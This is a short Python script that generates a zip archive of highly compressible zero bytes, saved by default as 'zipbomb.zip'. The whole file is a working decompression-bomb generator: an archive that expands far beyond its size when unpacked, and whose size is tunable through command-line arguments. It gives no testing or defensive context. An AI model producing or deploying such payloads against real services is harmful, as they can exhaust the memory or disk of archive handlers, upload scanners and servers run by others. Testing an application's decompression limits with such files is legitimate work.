import argparse
import zipfile
from io import BytesIO


def create_zip_file(output_zipfile, block_size, count):
    data = BytesIO()

    data_block = bytes([0] * block_size)
    for _ in range(count):
        data.write(data_block)

    data.seek(0)

    with zipfile.ZipFile(output_zipfile, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zip_info = zipfile.ZipInfo('data.bin')
        zip_info.compress_type = zipfile.ZIP_DEFLATED
        zipf.writestr(zip_info, data.getvalue())

    print(f"Created {output_zipfile} with {count} blocks of size {block_size} bytes.")


def main():
    parser = argparse.ArgumentParser(description='Create a zip file with specified parameters.')
    parser.add_argument('-z', '--zipfile', type=str, default='zipbomb.zip', help='Output zip file name')
    parser.add_argument('-b', '--block-size', type=int, default=1024, help='Block size in bytes')
    parser.add_argument('-c', '--count', type=int, default=10000, help='Number of blocks')
    args = parser.parse_args()

    create_zip_file(args.zipfile, args.block_size, args.count)


if __name__ == '__main__':
    main()
